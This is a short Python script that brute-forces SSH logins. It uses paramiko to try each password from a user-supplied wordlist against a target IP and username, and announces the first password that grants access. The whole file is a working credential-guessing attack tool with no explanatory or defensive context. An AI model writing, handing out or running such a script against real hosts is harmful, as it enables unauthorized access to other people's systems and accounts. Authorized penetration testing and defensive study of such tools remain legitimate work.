import paramiko, os, sys, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, username=username, port=22, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input('Enter Target\'s IP Address For Bruteforcing: ')
username = input('Enter Username Of The Target Machine: ')
password_file = input('Enter Password\'s List File/Path To Scan: ')

if os.path.exists(password_file) == False:
    print('File/Path does not exist on the system, please try again!')
    sys.exit(1)

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response==0:
                print(termcolor.colored(('[+] Access Enabled For Password "' + password + '" Of The Account "' + username + '"'), 'green'))
                break
            elif response==1:
                print('[-] Sorry, Incorrect Password! "' + password + '"')
            elif response==2:
                print(f'[!!!]Connection Unsuccessful.')
                sys.exit(1)
        except Exception as err:
            print(err)
            pass

